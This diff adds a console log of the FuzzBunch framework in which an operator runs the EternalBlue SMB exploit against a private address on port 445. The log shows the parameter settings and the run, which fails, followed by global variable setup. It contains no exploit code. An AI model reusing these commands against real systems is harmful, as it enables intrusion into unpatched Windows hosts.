@@ -1,0 +1,57 @@
+
+--[ Version 3.5.1
+
+[*] Loading Plugins
+fb > use EternalBlue
+
+[!] Entering Plugin Context :: Eternalblue
+[*] Applying Global Variables
+
+fb Special (Eternalblue) > set NetworkTimeout 10
+[+] Set NetworkTimeout => 10
+fb Special (Eternalblue) > set TargetIP 10.168.57.60
+[+] Set TargetIP => 10.168.57.60
+fb Special (Eternalblue) > execute
+
+[!] Preparing to Execute Eternalblue
+
+[*]  Mode :: Delivery mechanism
+
+   *0) FB       Traditional deployment from within FUZZBUNCH
+    1) DANE     Forward deployment via DARINGNEOPHYTE
+
+[+] Run Mode: 0
+
+
+Module: Eternalblue
+===================
+
+Name                  Value                                                 
+----                  -----                                                 
+DaveProxyPort         0                                                     
+NetworkTimeout        10                                                    
+TargetIp              10.168.57.60                                          
+TargetPort            445                                                   
+VerifyTarget          False                                                 
+VerifyBackdoor        True                                                  
+MaxExploitAttempts    3                                                     
+GroomAllocations      12                                                    
+ShellcodeBuffer                                                             
+Target                WIN72K8R2                                             
+
+[*] Executing Plugin
+[!] Plugin failed
+[-] Error: Eternalblue Failed
+[-] Aborting script
+fb Special (Eternalblue) > echo Initializing Fuzzbunch v3.5.1
+[*] Initializing Fuzzbunch v3.5.1
+fb Special (Eternalblue) > echo Adding Global Variables
+[*] Adding Global Variables
+fb Special (Eternalblue) > setg Color True
+[+] Set Color => True
+fb Special (Eternalblue) > setg ShowHiddenParameters False
+[+] Set ShowHiddenParameters => False
+fb Special (Eternalblue) > setg NetworkTimeout 60
+[+] Set NetworkTimeout => 60
+fb Special (Eternalblue) > setg LogDir G:\logs
+[+] Set LogDir => G:\logs
